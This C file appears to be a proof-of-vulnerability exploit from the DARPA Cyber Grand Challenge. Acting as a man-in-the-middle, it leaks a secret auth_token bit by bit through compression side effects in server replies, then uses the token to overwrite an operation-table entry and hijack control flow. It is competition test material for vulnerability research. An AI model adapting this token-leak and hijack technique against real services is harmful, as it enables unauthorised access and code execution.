/*
 * Copyright (C) Narf Industries <info@narfindustries.com>
 *
 * Permission is hereby granted, free of charge, to any person obtaining a
 * copy of this software and associated documentation files (the "Software"),
 * to deal in the Software without restriction, including without limitation
 * the rights to use, copy, modify, merge, publish, distribute, sublicense,
 * and/or sell copies of the Software, and to permit persons to whom the
 * Software is furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included
 * in all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
 * OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
 * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
 * IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
 * CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
 * TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */
 
#include "cgc_pov_1.h"

const char *CB_NAME = " POV_1";
const msg cgc_msgNull = { 0 };

/**
 * Reliably recv bytes.
 *
 * @param fd File descriptor where we will recv bytes.
 * @param buf Pointer to where we will cgc_write the bytes
 * @param size The amount of bytes to recv.
 * @return An int indicating SUCCESS (0) or an error condition (!=0).
 */
int cgc_recv_bytes(int fd, char *buf, unsigned int size) {

  int ret = SUCCESS;
  cgc_size_t bytes_left = size;
  cgc_size_t rx_bytes_local = 0;

  while (bytes_left) {

    rx_bytes_local = 0;

    CHK_SUCCESS(cgc_receive(STDIN, buf+(size-bytes_left), bytes_left, &rx_bytes_local),
       "receive() call within recv_bytes() failed\n");

    bytes_left -= rx_bytes_local;
  }

bail:
  return ret;
}


/**
 * Reliably send bytes.
 *
 * @param fd File descriptor to where we will send bytes.
 * @param buf Pointer to the bytes to send.
 * @param size The amount of bytes to send.
 * @return An int indicating SUCCESS (0) or an error condition (!=0).
 */
int cgc_send_bytes(int fd, const char *buf, unsigned int size) {

   int ret = SUCCESS;
   cgc_size_t bytes_left = size;
   cgc_size_t tx_bytes_local = 0;

   while (bytes_left) {

      tx_bytes_local = 0;

      CHK_SUCCESS(cgc_transmit(STDOUT, buf+(size-bytes_left), bytes_left, &tx_bytes_local),
         "transmit() call within send_bytes() failed\n");

      bytes_left -= tx_bytes_local;
   }

bail:
   return ret;
}


/**
 * Negotiate Type 2 POV with infrastructure.
 *
 * @return Error status
 */
int main(int cgc_argc, char *cgc_argv[]) {
  DBG("\n");

  int ret = SUCCESS;
  uint32_t hypothesis = 0;
  uint8_t leaked_bits = 0, prev_leaked_bits = 0;
  msg true_req, mod_req, mod_resp;
  type1_vals t1vals = { 0 };
  uint32_t mask_eip, mask_reg;
  msg msgExit = cgc_msgNull;
  msgExit.dst = DST_EXIT;

  // We need to hack around the fact that POV Type 1 negotiation might choose 
  // an EIP that falls within our .text segment.
  //  .text: 0x08048000 - 0x08146000
  // We do this in a simple manner by masking off the most significant nibble 
  // and then always choosing a non-zero value for it.
  mask_eip = 0x0FFFFFFF;
  mask_reg = 0xFFFFFFFF;
  CHK_SUCCESS(
      cgc_type1_negotiate(mask_eip, mask_reg, REGNUM_EAX, &t1vals), 
      "unable to negotiate with CGC infrastructure\n");

  DBG("negotiated: EIP = (0x%08x & 0x%08x), EAX = (0x%08x & 0x%08x)\n", 
        t1vals.ipval, mask_eip, t1vals.regval, mask_reg);

  // Let's choose something non-zero for the most significant nibble.
  t1vals.ipval |= 0xF0000000; 

  // Now onto leaking the auth_token.

  // We are an active mitm.  We modify traffic to cause chosen answers.  These 
  // chosen answers are compared against secret auth_token.  We leak 
  // auth_token 1 bit at a time via "compression" artifacts attached to RESPONSES.

  // General flow 2.0
  // CLIENT -true_req-> TAP -> POV (us)
  //  we cgc_read true_req off the wire (consume it), never respond to CLIENT
  //  we make a mod_req intended to leak some bits of auth_token via SERVER response
  // POV -mod_req-> SERVER
  //  we send the mod_req to the server
  // POV <-mod+resp-= SERVER
  //  SERVER answers according to our modified REQUEST
  //  we leak aat least 1 bit of the auth_token via the compression artifacts in mod_resp
  // REPEAT asking server question until we've leaked all the bits

  // We keep doing this until we've leaked the entire 4B auth_token, which we submit.

  // Get true_req, which we ignore.
  true_req = cgc_msgNull;
  CHK_SUCCESS(cgc_recv_bytes(PIPE_RECV, (char *)&true_req, sizeof(msg)),
    "[E] recv'ing true_req\n");

  uint8_t num_times_zero = 0;
  while (leaked_bits < 32) {
    hypothesis ^= (1 << (32-1-leaked_bits));
    DBG("[D] hypothesis = 0x%08x\n", hypothesis);
    prev_leaked_bits = leaked_bits;
    if (0 == hypothesis) { num_times_zero++; }

    // Make a mod_req
    mod_req = cgc_msgNull;
    mod_req.dst = DST_SERVER;
    // We want answer = hypothesis.
    uint8_t which_op = 0;
    CHK_SUCCESS(cgc_random(&which_op, sizeof(which_op), NULL), 
      "[E] couldn't get a random op number for obfuscation\n");
    which_op %= 2;
    uint32_t other_operand = 0;
    CHK_SUCCESS(cgc_random(&other_operand, sizeof(other_operand), NULL), 
      "[E] couldn't get a random op number for obfuscation\n");
    mod_req.y = other_operand;
    if (OP_ADD == which_op) {
      mod_req.x = hypothesis - other_operand;
      DBG("[D] mod_req.x = hypothesis - other_operand = 0x%08x\n", hypothesis - other_operand);
      DBG("[D] mod_req.x + mod_req.y = 0x%08x\n", mod_req.x + mod_req.y);
    } else if (OP_SUB == which_op) {
      mod_req.x = hypothesis + other_operand;
      DBG("[D] hypothesis + other_operand = 0x%08x\n", hypothesis + other_operand);
      DBG("[D] mod_req.x - mod_req.y = 0x%08x\n", mod_req.x - mod_req.y);
    } else {
      ERR("[E] shouldn't happen; chose an invalid op\n");
    }
    mod_req.op = which_op;

    CHK_SUCCESS(cgc_send_bytes(PIPE_SEND, (char *)&mod_req, sizeof(msg)),
      "[E] sending mod_req\n");

    mod_resp = cgc_msgNull;
    CHK_SUCCESS(cgc_recv_bytes(PIPE_RECV, (char *)&mod_resp, sizeof(msg)),
      "[E] recv'ing true_req\n");
    leaked_bits = mod_resp.nmb;

    if (32 < leaked_bits || // invalid
        leaked_bits < prev_leaked_bits || // we leaked less than last time
        num_times_zero > 2) { // we're not getting anywhere
      DBG("[D] invalid NMB (%d); patched CB?\n", leaked_bits);
      MSG_DUMP(mod_resp);

      goto bail;
      // msg msgExit = msgNull;
      // msgExit.dst = DST_EXIT;
      // CHK_SUCCESS(send_bytes(PIPE_SEND, (char *)&msgExit, sizeof(msg)),
      //   "[E] sending exit message\n");
      // // will be wrong - that's okay
      // CHK_SUCCESS(type2_submit((unsigned char *)&hypothesis, t2vals.read_size), 
      //   "[E] couldn't submit flag\n");
      // cgc__terminate(0); 
    }
    leaked_bits = mod_resp.nmb;
    DBG("[D] num of leaked bits: %02d leaked bits: 0x%08x\n", 
      leaked_bits, hypothesis);
  }

  // Okay we have the auth_token.
  DBG("[D] we've leaked the auth_token = 0x%08x\n", hypothesis);

  // Use the auth_token to exercise OP_MOD.
  DBG("[D] setting up\n");
  msg msgPov = cgc_msgNull;
  msgPov.dst = DST_SERVER;
  msgPov.x = hypothesis; // auth_token
  msgPov.y = t1vals.ipval; // where we wanna jump to
  msgPov.op = OP_MOD;
  uint8_t op_to_overwrite = 0;
  CHK_SUCCESS(cgc_random(&op_to_overwrite, sizeof(uint8_t), NULL), 
    "[E] couldn't get a random operation number\n");
  msgPov.nmb = op_to_overwrite; // operation to overwrite
  CHK_SUCCESS(cgc_send_bytes(PIPE_SEND, (char *)&msgPov, sizeof(msg)),
    "[E] proving vulnerability\n");

  // Okay we should have redirected the 42nd operation entry our negotiated 
  // ipval.  Time to call into it with controlled parameters.
  DBG("[D] triggering\n");
  msg msgTrigger = cgc_msgNull;
  msgTrigger.dst = DST_SERVER;
  msgTrigger.x = t1vals.regval;
  uint32_t rnd_y = 0;
  CHK_SUCCESS(cgc_random(&rnd_y, sizeof(uint32_t), NULL), 
    "[E] couldn't get a random operation number\n");
  msgTrigger.y = rnd_y;
  msgTrigger.op = op_to_overwrite;
  CHK_SUCCESS(cgc_send_bytes(PIPE_SEND, (char *)&msgTrigger, sizeof(msg)),
    "[E] triggering setup\n");

  // msg msgExit = msgNull;
  // msgExit.dst = DST_EXIT;
  // CHK_SUCCESS(send_bytes(PIPE_SEND, (char *)&msgExit, sizeof(msg)),
  //   "[E] sending exit message\n");

  DBG("[D] done\n");

bail:
  CHK_SUCCESS(cgc_send_bytes(PIPE_SEND, (char *)&msgExit, sizeof(msg)),
    "[E] sending exit message\n");
  return ret;
}

